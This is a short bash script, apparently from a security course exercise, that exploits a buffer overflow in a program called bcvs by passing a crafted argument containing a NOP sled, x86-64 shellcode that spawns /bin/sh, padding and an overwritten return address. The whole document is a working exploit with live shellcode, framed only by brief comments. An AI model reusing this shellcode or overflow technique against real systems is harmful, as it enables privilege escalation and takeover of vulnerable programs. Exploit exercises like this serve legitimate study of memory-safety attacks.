#!/bin/bash

# Exploit 5
# Take advantage of bcvs using realpath and create a buffer overflow.
# We can overflow the pathname buffer at bcvs.c:55 and take control of the program.

DIRNAME=sploit5
rm -rf $DIRNAME

# Create directory to work in for this exploit
mkdir $DIRNAME
cd $DIRNAME

# Create repository
mkdir .bcvs
touch .bcvs/block.list

# Run the executable with our buffer overflow
echo "Run bcvs"
/opt/bcvs/bcvs ci $(python2 -c 'print(b"\x90"*455+b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"+"B"*35+b"\x50\xed\xff\xff\xff\x7f")')

# Clean up our files
echo "Clean up helper files"
cd ../
rm -rf $DIRNAME
